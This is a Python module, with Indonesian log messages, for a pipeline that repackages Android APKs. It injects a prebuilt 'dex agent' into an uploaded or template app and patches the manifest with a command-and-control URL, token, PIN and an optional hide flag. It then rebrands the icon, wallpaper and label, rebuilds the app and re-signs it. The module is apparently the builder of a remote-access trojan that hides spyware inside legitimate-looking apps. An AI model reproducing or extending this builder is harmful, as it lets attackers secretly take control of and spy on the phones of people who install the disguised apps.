"""Pipeline build & patch APK."""
from __future__ import annotations

import asyncio
import hashlib
import secrets
import shutil
import time
import uuid
import zipfile
from pathlib import Path
from typing import Callable

from . import branding, config, db, injector, signer

Log = Callable[[str], None]


def _apktool() -> str:
    tool = shutil.which("apktool")
    if tool is None:
        raise RuntimeError("apktool tidak ditemukan. Jalankan ./install.sh")
    return tool


def new_token() -> str:
    return secrets.token_urlsafe(24)


def _run(args: list[str], cwd: Path | None = None) -> None:
    proc = subprocess_run(args, cwd)
    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or b"")[-1200:].decode(errors="replace")
        raise RuntimeError(f"{args[0]} gagal: {tail}")


def subprocess_run(args: list[str], cwd: Path | None = None):
    import subprocess

    return subprocess.run(args, cwd=cwd, capture_output=True, timeout=1200)


def decode(apk: Path, work: Path, log: Log) -> Path:
    decoded = work / "decoded"
    log("apktool decode...")
    _run([_apktool(), "d", "-f", "-o", str(decoded), str(apk)])
    return decoded


def build_decoded(decoded: Path, work: Path, log: Log) -> Path:
    unsigned = work / "unsigned.apk"
    log("apktool build...")
    _run([_apktool(), "b", str(decoded), "-o", str(unsigned)])
    return unsigned


def finalize(unsigned: Path, out: Path, log: Log) -> Path:
    aligned = out.with_suffix(".aligned.apk")
    log("zipalign...")
    signer.zipalign(unsigned, aligned)
    log("signing...")
    signer.sign(aligned)
    shutil.move(str(aligned), str(out))
    return out


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> None:
    """Jalankan job build di thread terpisah."""
    loop = asyncio.get_running_loop()

    def log(line: str) -> None:
        stamp = time.strftime("%H:%M:%S")
        row = db.one("SELECT log FROM builds WHERE id=?", (build_id,))
        prev = row["log"] if row else ""
        db.x("UPDATE builds SET log=?,updated=? WHERE id=?",
             ((prev or "") + f"[{stamp}] {line}\n"[-20000:], time.time(), build_id))

    db.x("UPDATE builds SET status='proses',updated=? WHERE id=?", (time.time(), build_id))
    work = config.BUILD_DIR / build_id
    work.mkdir(parents=True, exist_ok=True)
    out = config.BUILD_DIR / f"{build_id}.apk"

    try:
        if mode == "patch" and source is not None:
            decoded = await loop.run_in_executor(None, decode, source, work, log)
            log("inject dex agent...")
            n = await loop.run_in_executor(None, injector.inject_dex, decoded, config.PREBUILT_DIR / "agent.apk")
            log(f"{n} dex disisipkan")
            await loop.run_in_executor(None, injector.inject_assets, decoded)
            log("patch manifest...")
            await loop.run_in_executor(
                None, injector.patch_manifest, decoded,
                opts["c2_url"], opts["token"], opts["pin"],
                opts["email"], opts["team"], bool(opts.get("hide")),
            )
            if opts.get("icon"):
                await loop.run_in_executor(
                    None, branding.write_icons, Path(opts["icon"]).read_bytes(), decoded / "res")
            if opts.get("wallpaper"):
                await loop.run_in_executor(
                    None, branding.write_wallpaper, Path(opts["wallpaper"]).read_bytes(), decoded / "res")
            if opts.get("label"):
                await loop.run_in_executor(
                    None, branding.patch_strings, decoded / "res" / "values" / "mzk_strings.xml",
                    opts["label"], opts.get("wizard", ""), opts["email"], opts["team"])
            unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)
        else:
            base = config.PREBUILT_DIR / "template.apk"
            if not base.exists():
                raise RuntimeError("agent/prebuilt/template.apk tidak ada")
            shutil.copy2(base, work / "template.apk")
            decoded = await loop.run_in_executor(None, decode, work / "template.apk", work, log)
            log("inject dex agent...")
            await loop.run_in_executor(None, injector.inject_dex, decoded, config.PREBUILT_DIR / "agent.apk")
            await loop.run_in_executor(None, injector.inject_assets, decoded)
            await loop.run_in_executor(
                None, injector.patch_manifest, decoded,
                opts["c2_url"], opts["token"], opts["pin"],
                opts["email"], opts["team"], bool(opts.get("hide")),
            )
            unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)

        await loop.run_in_executor(None, finalize, unsigned, out, log)
        size = out.stat().st_size
        db.x("UPDATE builds SET status='selesai',outfile=?,size=?,updated=? WHERE id=?",
             (str(out), size, time.time(), build_id))
        log(f"SELESAI · {size/1048576:.2f} MB · sha256 {sha256(out)[:16]}…")
        shutil.rmtree(work, ignore_errors=True)
    except Exception as exc:  # noqa: BLE001
        db.x("UPDATE builds SET status='gagal',updated=? WHERE id=?", (time.time(), build_id))
        log(f"GAGAL: {exc}")
    finally:
        if source is not None and source.exists():
            source.unlink(missing_ok=True)


def create_build(name: str, package: str, mode: str, source: Path | None, opts: dict) -> str:
    build_id = uuid.uuid4().hex[:12]
    now = time.time()
    db.x(
        "INSERT INTO builds(id,name,package,mode,status,log,created,updated)"
        " VALUES(?,?,?,?,'antri','',?,?)",
        (build_id, name, package, mode, now, now),
    )
    return build_id


def inspect_apk(path: Path) -> dict:
    """Baca package/versi dari APK tanpa decode penuh."""
    info = {"package": "", "version": "", "label": "", "valid": False}
    try:
        with zipfile.ZipFile(path) as z:
            if "AndroidManifest.xml" not in z.namelist():
                return info
            info["valid"] = True
    except zipfile.BadZipFile:
        return info
    try:
        proc = subprocess_run([_apktool(), "d", "-s", "-f", "-o", "/tmp/mzk_inspect", str(path)])
        if proc.returncode == 0:
            mf = Path("/tmp/mzk_inspect/AndroidManifest.xml").read_text(errors="replace")
            import re
            m = re.search(r'package="([^"]+)"', mf)
            v = re.search(r'versionName="([^"]*)"', mf)
            info["package"] = m.group(1) if m else ""
            info["version"] = v.group(1) if v else ""
        shutil.rmtree("/tmp/mzk_inspect", ignore_errors=True)
    except Exception:  # noqa: BLE001
        pass
    return info
